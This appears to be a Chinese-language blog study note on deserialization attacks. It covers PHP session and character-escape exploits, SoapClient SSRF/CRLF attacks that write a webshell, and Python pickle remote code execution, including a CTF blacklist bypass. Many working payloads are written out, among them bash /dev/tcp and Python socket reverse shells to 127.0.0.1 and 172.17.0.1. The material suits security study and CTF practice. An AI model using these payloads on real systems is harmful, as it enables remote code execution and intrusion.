+<p>（3）存储引擎</p>
+<p>PHP中的session中的内容默认是以文件的方式储存，储存方式是由配置项<code>session.save_handler</code>来进行确定的，默认是以文件的方式储存。储存的文件是以<code>sess_PHPSESSID</code>来进行命名的，文件的内容就是session值得序列化之后得内容。</p>
+<p><code>session.serialize_handler</code>有如下三种取值：</p>
+<p><img src="/%E5%85%AB%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20220330143941490.png" alt="image-20220330143941490"></p>
+<h5 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h5><p>当网站序列化存储session与反序列化读取session方式不同时，就可能导致session反序列化漏洞的产生。一般都是以<code>php_serialize</code>序列化存储session，以PHP反序列化读取session，造成反序列化攻击</p>
+<p>eg：</p>
+<p><img src="/%E5%85%AB%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20220330144229162.png" alt="image-20220330144229162"></p>
+<p><code>unserialize</code>的特性，在执行<code>unserialize</code>的时候，如果字符串前面满足了可被序列化的规则，则后学的字符就会被忽略</p>
+<p>exp：</p>
+<pre><code>&lt;?php
+class session&#123;
+  var $var=&quot;system(&#39;calc&#39;);&quot;;
+&#125;
+echo &quot;|&quot;.serialize(new session());
+</code></pre>
+<p>在s1.php传入即可</p>
+<p>上文可以给<code>$_SESSION</code>赋值，若代码中不存在给<code>$_SESSION</code>赋值可以利用<code>uplode_process</code>机制，可以在<code>$_SESSION</code>中创建一个键值对，其中的值可以控制</p>
+<pre><code>&lt;?php
+$key=ini_get(&quot;session.upload_progress.prefix&quot;) . ini_get(&quot;session.upload_progress.name&quot;);
+var_dump($_SESSION[$key]);
+?&gt;
+</code></pre>
+<h4 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h4><p>当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生PHP反序列化字符逃逸的漏洞。</p>
+<h5 id="过滤后字符变多"><a href="#过滤后字符变多" class="headerlink" title="过滤后字符变多"></a>过滤后字符变多</h5><p>eg：</p>
+<p>源码</p>
+<pre><code class="php">&lt;?php
+class user&#123;
+    public $username;
+    public $password;
+    public $isVIP;
+    
+    public function __construct($u,$p)&#123;
+        $this-&gt;username = $u;
+        $this-&gt;password = $p;
+        $this-&gt;isVIP = 0;
+    &#125;
+&#125;
+
+function filter($s)&#123;
+    return str_replace(&quot;admin&quot;,&quot;hacker&quot;,$s);
+&#125;
+
+$a = new user(&quot;admin&quot;,&quot;123456&quot;);
+$a_seri = serialize($a);
+$a_seri_filter = filter($a_seri);
+
+echo $a_seri_filter;
+?&gt;
+</code></pre>
+<p>序列化后的结果将admin替换为hacker</p>
+<pre><code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;  //未过滤
+O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125; //已过滤
+</code></pre>
+<p>过滤后字符串长度+1，而前面的长度标志仍是5，这样最后一个字符就逃逸了</p>
+<p>下一步就是想办法将默认的isVIP的值换为1</p>
+<p>对比目标字符串和现有字符串：</p>
+<pre><code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;	//现有子串
+&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;	//目标子串
+</code></pre>
+<p>长度一样均为47。如果我们想办法将目标字符串作为我们输入的结尾再让现有的字符串逃逸掉，这样最终得到的就是我们需要的。</p>
+<p>输入：</p>
+<p>重复47次admin，那么过滤成hacker后就会逃逸掉47个字符</p>
+<pre><code>adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;
+</code></pre>
+<p>最终：</p>
+<pre><code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;
+</code></pre>
+<h5 id="过滤后字符变少"><a href="#过滤后字符变少" class="headerlink" title="过滤后字符变少"></a>过滤后字符变少</h5><p>思路与上面一样</p>
+<p>源码：</p>
+<pre><code class="php">&lt;?php
+class user&#123;
+    public $username;
+    public $password;
+    public $isVIP;
+    
+    public function __construct($u,$p)&#123;
+        $this-&gt;username = $u;
+        $this-&gt;password = $p;
+        $this-&gt;isVIP = 0;
+    &#125;
+&#125;
+
+function filter($s)&#123;
+    return str_replace(&quot;admin&quot;,&quot;hack&quot;,$s);
+&#125;
+
+$a = new user(&#39;admin&#39;,&#39;123456&#39;);
+$a_seri = serialize($a);
+$a_seri_filter = filter($a_seri);
+
+echo $a_seri_filter;
+?&gt;
+</code></pre>
+<p>可控变量：</p>
+<p>username，password</p>
+<p>PHP反序列化的机制是，比如如果前面是规定了有10个字符，但是只读到了9个就到了双引号，这个时候PHP会把双引号当做第10个字符，也就是说不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量来读取字符串。</p>
+<p>因为过滤的时候，将<strong>5</strong>个字符删减为了<strong>4</strong>个，所以和上面字符变多的情况相反，随着加入的<strong>admin</strong>的数量增多，<strong>现有子串</strong>后面会缩进来。</p>
+<p>计算一下<strong>目标子串</strong>的长度：</p>
+<pre><code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;	//目标子串
+//长度为47
+</code></pre>
+<p>再计算一下到<strong>下一个可控变量</strong>的字符串长度：</p>
+<pre><code>&quot;;s:8:&quot;password&quot;;s:6:&quot;
+//长度为22
+</code></pre>
+<p>payload</p>
+<pre><code>adminadmnadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#39;,&#39;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;
+</code></pre>
+<p>结果：</p>
+<pre><code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:115:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;
+</code></pre>
+<p>即第一个可控变量将到下一个可控变量前的字符吞掉，第二个可控变量修改结尾，原来的结尾由于大于长度被逃逸掉</p>
+<h4 id="原生类利用"><a href="#原生类利用" class="headerlink" title="原生类利用"></a>原生类利用</h4><p>有反序列化但原本的代码中找不到pop链的时候，通过原生类构造反序列化漏洞</p>
+<h5 id="Error-x2F-Exception-内置类"><a href="#Error-x2F-Exception-内置类" class="headerlink" title="Error&#x2F;Exception 内置类"></a>Error&#x2F;Exception 内置类</h5><h6 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h6><p>error：</p>
+<ul>
+<li>适用于php7版本</li>
+<li>在开启报错的情况下</li>
+</ul>
+<p>exception：</p>
+<ul>
+<li>适用于php5、7版本</li>
+<li>开启报错的情况下</li>
+</ul>
+<h6 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h6><p>Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 <code>__toString()</code> 的方法，常用于PHP 反序列化中。当 PHP 对象被当作一个字符串输出或使用时候（如<code>echo</code>的时候）会触发<code>__toString</code> 方法</p>
+<p>eg;</p>
+<pre><code>&lt;?php
+$a = unserialize($_GET[&#39;whoami&#39;]);
+echo $a;
+?&gt;
+</code></pre>
+<p>exp:</p>
+<pre><code>&lt;?php
+$a = new Error(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;);
+$b = serialize($a);
+echo urlencode($b);  
+?&gt;
+</code></pre>
+<h6 id="绕过哈希比较"><a href="#绕过哈希比较" class="headerlink" title="绕过哈希比较"></a>绕过哈希比较</h6><p>eg：</p>
+<pre><code>&lt;?php
+$a = new Error(&quot;payload&quot;,1);$b = new Error(&quot;payload&quot;,2);
+echo $a;
+echo &quot;\r\n\r\n&quot;;
+echo $b;
+</code></pre>
+<p>输出如下：</p>
+<pre><code>Error: payload in /usercode/file.php:2
+Stack trace:
+#0 &#123;main&#125;
+
+Error: payload in /usercode/file.php:2
+Stack trace:
+#0 &#123;main&#125;
+</code></pre>
+<p>发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 <code>Error(&quot;payload&quot;,1)</code> 中的错误代码“1”则没有输出出来。</p>
+<p><code>$a</code> 和 <code>$b</code> 这两个错误对象本身是不同的，但是 <code>__toString</code> 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 <code>__toString</code> 返回的数据包含当前行号。</p>
+<p>Exception 类与 Error 的使用和结果完全一样，只不过 <code>Exception</code> 类适用于PHP 5和7，而 <code>Error</code> 只适用于 PHP 7</p>
+<h5 id="SoapClient-类"><a href="#SoapClient-类" class="headerlink" title="SoapClient 类"></a>SoapClient 类</h5><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p>
+<p>该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
+<p>该类的构造函数如下：</p>
+<pre><code>public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
+</code></pre>
+<ul>
+<li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li>
+<li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li>
+</ul>
+<p>在官方文档中可以看到，它的user_agent 参数是可以控制 HTTP头部的 User-Agent 的。而在HTTP 协议中，header 与body 是用两个 <code>\r\n</code>分隔的，浏览器也是通过这两个 \r\n来区分 header 和body 的。</p>
+<h6 id="使用-SoapClient-类进行-SSRF"><a href="#使用-SoapClient-类进行-SSRF" class="headerlink" title="使用 SoapClient 类进行 SSRF"></a>使用 SoapClient 类进行 SSRF</h6><p>payload:</p>
+<pre><code class="php">&lt;?php
+$a = new SoapClient(null,array(&#39;location&#39;=&gt;&#39;http://47.xxx.xxx.72:2333/aaa&#39;, &#39;uri&#39;=&gt;&#39;http://47.xxx.xxx.72:2333&#39;));
+$b = serialize($a);
+echo $b;
+$c = unserialize($b);
+$c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
+?&gt;
+</code></pre>
+<p>但是，由于它仅限于HTTP&#x2F;HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。</p>
+<p>攻击redis：</p>
+<pre><code>&lt;?php
+$target = &#39;http://47.xxx.xxx.72:6379/&#39;;
+$poc = &quot;CONFIG SET dir /var/www/html&quot;;
+$a = new SoapClient(null,array(&#39;location&#39; =&gt; $target, &#39;uri&#39; =&gt; &#39;hello^^&#39;.$poc.&#39;^^hello&#39;));
+$b = serialize($a);
+$b = str_replace(&#39;^^&#39;,&quot;\n\r&quot;,$b); 
+echo $b;
+$c = unserialize($b);
+$c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
+?&gt;
+</code></pre>
+<p>对于如何发送POST的数据包，这里面还有一个坑，就是 <code>Content-Type</code> 的设置，因为我们要提交的是POST数据 <code>Content-Type</code> 的值我们要设置为 <code>application/x-www-form-urlencoded</code>，这里如何修改 <code>Content-Type</code> 的值呢？由于 <code>Content-Type</code> 在 <code>User-Agent</code> 的下面，所以我们可以通过 <code>SoapClient</code> 来设置 <code>User-Agent</code> ，将原来的 <code>Content-Type</code> 挤下去，从而再插入一个新的 <code>Content-Type</code> 。</p>
+<p>eg;</p>
+<pre><code>&lt;?php
+$target= &#39;http://127.0.0.1/test.php&#39;;
+$post_string= &#39;1=file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;);&#39;;
+$headers= array(
+   &#39;X-Forwarded-For:127.0.0.1&#39;,
+   &#39;Cookie:admin=1&#39;
+   );
+$b= new SoapClient(null,array(&#39;location&#39;=&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type:application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length:&#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;=&gt;&quot;peri0d&quot;));
+
+$aaa= serialize($b);
+$aaa= str_replace(&#39;^^&#39;,&#39;%0d%0a&#39;,$aaa);
+$aaa= str_replace(&#39;&amp;&#39;,&#39;%26&#39;,$aaa);
+echo $aaa;
+
+$x= unserialize(urldecode($aaa));
+$x-&gt;no_func();
+</code></pre>
+<p>test.php</p>
+<pre><code>&lt;?php 
+if($_SERVER[&#39;REMOTE_ADDR&#39;]==&#39;127.0.0.1&#39;)&#123;
+    echo &#39;hi&#39;;
+    @$a=$_POST[1];
+    @eval($a);
+&#125;
+?&gt;
+</code></pre>
+<p>这样就可以成功写入<code>shell.php</code>。</p>
+<h5 id="DirectoryIterator-类"><a href="#DirectoryIterator-类" class="headerlink" title="DirectoryIterator 类"></a>DirectoryIterator 类</h5><p>DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口，该类是在 PHP 5 中增加的一个类。</p>
+<p>DirectoryIterator与glob:&#x2F;&#x2F;协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。</p>
+<p>eg:</p>
+<pre><code>// test.php
+&lt;?php
+$dir = $_GET[&#39;whoami&#39;];
+$a = new DirectoryIterator($dir);
+foreach($a as $f)&#123;
+    echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);
+&#125;
+?&gt;
+
+# payload一句话的形式:
+$a = new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#125;
+</code></pre>
+<p>输入 <code>/?whoami=glob:///*</code> 即可列出根目录下的文件</p>
+<p>只能列根目录和open_basedir指定的目录的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。</p>
+<h5 id="SimpleXMLElement-类"><a href="#SimpleXMLElement-类" class="headerlink" title="SimpleXMLElement 类"></a>SimpleXMLElement 类</h5><p>SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。</p>
+<p>官方文档中对于SimpleXMLElement 类的构造方法 <code>SimpleXMLElement::__construct</code> 的定义如下：</p>
+<p><img src="/%E5%85%AB%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20220331135510801.png" alt="image-20220331135510801"></p>
+<p>可以看到通过设置第三个参数 data_is_url 为 true，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为2即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。</p>
+<p>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269434.htm">https://bbs.pediy.com/thread-269434.htm</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/01/01/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#Demo1%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">https://www.mi1k7ea.com/2019/01/01/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#Demo1%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6699#toc-0">https://xz.aliyun.com/t/6699#toc-0</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2958#toc-0">https://xz.aliyun.com/t/2958#toc-0</a></p>
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>Python 中有很多能进行序列化的模块，比如 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/gcgc/p/10973418.html">Json、pickle&#x2F;cPickle、Shelve</a>、<a target="_blank" rel="noopener" href="https://docs.python.org/zh-tw/3/library/marshal.html">Marshal</a></p>
+<p>一般 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/pickle.html">pickle</a> 模块较常使用</p>
+<h4 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h4><p>在 pickle 模块中 , 常用以下四个方法</p>
+<ul>
+<li><code>pickle.dump(obj, file)</code> : 将对象序列化后保存到文件</li>
+<li><code>pickle.load(file)</code> : 读取文件， 将文件中的序列化内容反序列化为对象</li>
+<li><code>pickle.dumps(obj)</code> : 将对象序列化成字符串格式的字节流</li>
+<li><code>pickle.loads(bytes_obj)</code> : 将字符串格式的字节流反序列化为对象<br>注意：file文件需要以 2 进制方式打开，如 <code>wb</code>、<code>rb</code></li>
+</ul>
+<p>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发<code>__reduce__()</code>函数从而触发恶意代码。</p>
+<p>简单说明一下<code>__reduce__()</code>函数：将一个数据集合（链表，元组等）中的所有数据进行下列操作：用传给 reduce 中的函数 function（有两个参数）先对集合中的第 1、2 个元素进行操作，得到的结果再与第三个数据用 function 函数运算，最后得到一个结果</p>
+<h5 id="漏洞发现-1"><a href="#漏洞发现-1" class="headerlink" title="漏洞发现"></a>漏洞发现</h5><p><strong>1.通常在解析认证token，session的时候</strong></p>
+<p>现在很多web都使用redis、mongodb、memcached等来存储session等状态信息。</p>
+<p><strong>2.可能将对象Pickle后存储成磁盘文件。</strong></p>
+<p><strong>3.可能将对象Pickle后在网络中传输。</strong></p>
+<p>其实，最常见的也是最经典的也就是我们的第一点，也就是 flask 配合 redis 在服务端存储 session 的情景，这里的 session 是被 pickle 序列化进行存储的，如果你通过 cookie 进行请求 sessionid 的话，session 中的内容就会被反序列化，看似好像是没有什么问题,因为 session 是存储在 服务端的，但是终究是抵不住 redis 的未授权访问，如果出现未授权的话，我们就能通过 set 设置自己的 session ,然后通过设置 cookie 去请求 session 的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的。</p>
+<h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><h6 id="基本利用"><a href="#基本利用" class="headerlink" title="基本利用"></a>基本利用</h6><p>eg：</p>
+<pre><code>import pickle
+import os
+class A(object):
+    def __reduce__(self):
+        a = &#39;/bin/sh&#39;
+        return (os.system,(a,))
+a = A()
+test = pickle.dumps(a)
+pickle.loads(test)
+</code></pre>
+<p>执行反序列化后，os.system(‘&#x2F;bin&#x2F;sh’,)启动，并等待输入流输入命令，实现弹shell</p>
+<p>小结：</p>
+<p>代码执行&#x2F;命令执行可用函数</p>
+<pre><code class="python">eval, execfile, compile, open, file, map, input,
+os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe,
+os.listdir, os.access,
+os.execl, os.execle, os.execlp, os.execlpe, os.execv,
+os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,
+os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,
+pickle.load, pickle.loads,cPickle.load,cPickle.loads,
+subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,
+commands.getstatusoutput,commands.getoutput,commands.getstatus,
+glob.glob,
+linecache.getline,
+shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,
+dircache.listdir,dircache.opendir,
+io.open,
+popen2.popen2,popen2.popen3,popen2.popen4,
+timeit.timeit,timeit.repeat,
+sys.call_tracing,
+code.interact,code.compile_command,codeop.compile_command,
+pty.spawn,
+posixfile.open,posixfile.fileopen,
+platform.popen
+</code></pre>
+<p>几个不常用的payload：</p>
+<pre><code class="python">map(__import__(&#39;os&#39;).system,[&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;,])
+
+sys.call_tracing(__import__(&#39;os&#39;).system,(&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;,))
+
+platform.popen(&quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;&quot;)
+</code></pre>
+<h6 id="从input到shell"><a href="#从input到shell" class="headerlink" title="从input到shell"></a>从input到shell</h6><p>input函数在python2中是能够执行python代码的</p>
+<p>几个序列化符号：</p>
+<pre><code>c：读取新的一行作为模块名module，读取下一行作为对象名object，然后将module.object压入到堆栈中。
+(：将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与t搭配使用，以产生一个元组。
+t：从堆栈中弹出对象，直到一个“(”被弹出，并创建一个包含弹出对象（除了“(”）的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。
+S：读取引号中的字符串直到换行符处，然后将它压入堆栈。
+R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。
+.：结束pickle。
+</code></pre>
+<p>input是从标准输入获取参数，所以我们需要修改其输入流</p>
+<p>我们可以利用StringIO库，然后将标准输入修改为StringIO创建的内存缓冲区即可</p>
+<p>通常我们这么改：</p>
+<p><img src="/%E5%85%AB%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20220402134214610-16488781360851.png" alt="image-20220402134214610"></p>
+<p>但在pickle的0号协议（我们序列化常用协议，比其它的相比更易阅读）不能用等号，所以使用setattr</p>
+<p><img src="/%E5%85%AB%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20220402135239077.png" alt="image-20220402135239077"></p>
+<p>构造</p>
+<pre><code>c__builtin__
+setattr
+(c__builtin__
+__import__
+(S&#39;sys&#39;
+tRS&#39;stdin&#39;
+cStringIO
+StringIO
+(S&#39;__import__(&#39;os&#39;).system(\&#39;curl 127.0.0.1:12345\&#39;)&#39;
+tRtRc__builtin__
+input
+(S&#39;input: &#39;
+tR.
+</code></pre>
+<p>payload:</p>
+<pre><code class="python">a=&#39;&#39;&#39;c__builtin__\nsetattr\n(c__builtin__\n__import__\n(S&#39;sys&#39;\ntRS&#39;stdin&#39;\ncStringIO\nStringIO\n(S&#39;__import__(&#39;os&#39;).system(&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;)&#39;\ntRtRc__builtin__\ninput\n(S&#39;python&gt; &#39;\ntR.&#39;&#39;&#39;
+
+pickle.loads(a)
+</code></pre>
+<h6 id="类函数构造"><a href="#类函数构造" class="headerlink" title="类函数构造"></a>类函数构造</h6><p>这里主要使用<code>new.classobj</code>函数来构造一个类函数对象然后执行，这样就可以调用原有库的一些函数，也可以自己构造。</p>
+<pre><code class="python">payload=pickle.dumps(new.classobj(&#39;system&#39;, (), &amp;#123;&#39;__getinitargs__&#39;:lambda self,arg=(&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;,):arg, &#39;__module__&#39;: &#39;os&#39;&amp;#125;)())
+pickle.loads(payload)
+</code></pre>
+<h6 id="与SSTI的配合"><a href="#与SSTI的配合" class="headerlink" title="与SSTI的配合"></a>与SSTI的配合</h6><p>使用了flask框架</p>
+<pre><code class="python">payload=&quot;cflask.templating\nrender_template_string\np0\n(S\&quot;&amp;#123;% for x in (().__class__.__base__.__subclasses__()) %&amp;#125;&amp;#123;%if x.__name__ ==&#39;catch_warnings&#39;%&amp;#125;&amp;#123;&amp;#123;x.__repr__.im_func.func_globals.linecache.os.system(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.17.0.1/12345 0&gt;&amp;1\&quot; &amp;&#39;)&amp;#125;&amp;#125;&amp;#123;%endif%&amp;#125;&amp;#123;%endfor%&amp;#125;\&quot;\np1\ntp2\nRp3\n.&quot;
+</code></pre>
+<p>pickle注入payload生成器：<a target="_blank" rel="noopener" href="https://github.com/sensepost/anapickle">https://github.com/sensepost/anapickle</a></p>
+<h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><h6 id="当reduce被过滤"><a href="#当reduce被过滤" class="headerlink" title="当reduce被过滤"></a>当reduce被过滤</h6><p>reduce方法底层实现的操作码是R，只需把操作码R过滤掉即可。这使用pickletools.genops即可实现</p>
+<p>有一种过滤方式：不禁止<code>R</code>指令码，但是对<code>R</code>执行的函数有黑名单限制。典型的例子是2018-XCTF-HITB-WEB : Python’s-Revenge。给了好长好长一串黑名单：</p>
+<pre><code>black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]
+</code></pre>
+<p>可惜<code>platform.popen()</code>不在名单里，它可以做到类似<code>system</code>的功能。</p>
+<pre><code>import pickle, pickletools, platform
+
+class exp():
+    def __reduce__(self):
+        s = r&quot;&quot;&quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.17.0.1&quot;,30006));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;&quot;&quot;&quot;
+        return (platform.popen, (s,))
+        #return  (map, (__import__(&#39;os&#39;).system(s)))
+
+a = pickle.dumps(exp())
+a = pickletools.optimize(a)
+print(a)
+b = pickle.loads(a)
+print(b)
+</code></pre>
+<p>预期解</p>
+<p>利用map</p>
+<pre><code class="text">class Exploit(object):
+    def __reduce__(self):
+     return map,(os.system,[&quot;ls&quot;])
+</code></pre>
+<p>最稳妥的方式是禁止掉<code>R</code>这个指令码</p>
+<p>彻底过滤了<code>R</code>指令码（写法是：只要见到payload里面有<code>R</code>这个字符，就直接驳回，简单粗暴）。现在的任务是：给出一个字符串，<strong>反序列化之后，name和grade需要与blue这个module里面的name、grade相对应</strong>。</p>
+<p>使用c指令码获取全局变量的功能将name换成blue name</p>
+<p>以name的为例，只需要把硬编码的<code>rxz</code>改成从<code>blue</code>引入的<code>name</code>，写成指令就是：<code>cblue\nname\n</code>。把用于编码<code>rxz</code>的<code>X\x03\x00\x00\x00rxz</code>替换成我们的这个global指令</p>
+<p>顺带一提，由于pickle导出的字符串里面有很多的不可见字符，所以一般都经过base64编码之后传输。</p>
